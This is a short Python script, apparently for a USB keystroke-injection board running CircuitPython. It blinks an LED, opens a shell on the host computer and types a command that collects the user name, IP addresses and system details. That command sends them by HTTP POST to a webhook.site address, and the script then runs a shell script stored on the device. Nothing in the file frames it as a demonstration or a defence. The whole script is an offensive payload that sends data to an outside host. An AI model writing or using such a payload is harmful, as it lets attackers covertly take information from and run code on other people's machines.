from time import sleep
from functions.led25 import triple_blink
from functions.write_es import *

triple_blink()
open_shell()
pulse_keys("(whoami; hostname -I; uname -a) | curl -X POST -d @- https://webhook.site/55440a10-9228-426d-830c-b3716c0cff35", 1)
enter()
pulse_keys("bash /media/$(whoami)/CIRCUITPY/anim.sh", 0.2)
#pulse_keys("exit", 0)
enter()